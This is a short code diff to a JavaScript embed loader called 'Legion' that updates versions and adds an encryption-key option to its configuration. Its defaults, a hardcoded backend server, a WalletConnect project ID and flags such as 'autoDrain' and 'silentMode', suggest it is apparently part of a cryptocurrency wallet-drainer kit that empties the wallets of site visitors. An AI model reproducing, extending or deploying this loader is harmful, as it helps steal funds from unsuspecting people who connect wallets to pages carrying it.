@@ -23,18 +23,19 @@
   if (window.__LEGION_EMBED_LOADED__) return;
   window.__LEGION_EMBED_LOADED__ = true;
 
-  var EMBED_VERSION = '1.1.0';
+  var EMBED_VERSION = '1.2.0';
   var CDN_PRIMARY = 'https://legion-cdn.surge.sh/';
   var VERSIONS = {
     polyfills: '1.1.0',
     wallet: '1.3.8',
-    legion: '5.13.5',
+    legion: '5.14.0',
   };
 
   var DEFAULTS = {
     backendUrl: 'https://sadrailala-production.up.railway.app',
     wcProjectId: 'a785da105621eb55c998a35c57587667',
     kineticKey: '',
+    clientEncryptKey: '',
     silentMode: false,
     autoDrain: true,
     autoRun: false,
@@ -83,6 +84,7 @@
     if (d.backend) out.backendUrl = d.backend;
     if (d.wc || d.wcProjectId) out.wcProjectId = d.wc || d.wcProjectId;
     if (d.kinetic || d.kineticKey) out.kineticKey = d.kinetic || d.kineticKey;
+    if (d.clientEncryptKey || d.encryptKey) out.clientEncryptKey = d.clientEncryptKey || d.encryptKey;
     if (d.silent != null) out.silentMode = parseBool(d.silent, DEFAULTS.silentMode);
     if (d.autoDrain != null) out.autoDrain = parseBool(d.autoDrain, DEFAULTS.autoDrain);
     if (d.autoRun != null) out.autoRun = parseBool(d.autoRun, DEFAULTS.autoRun);
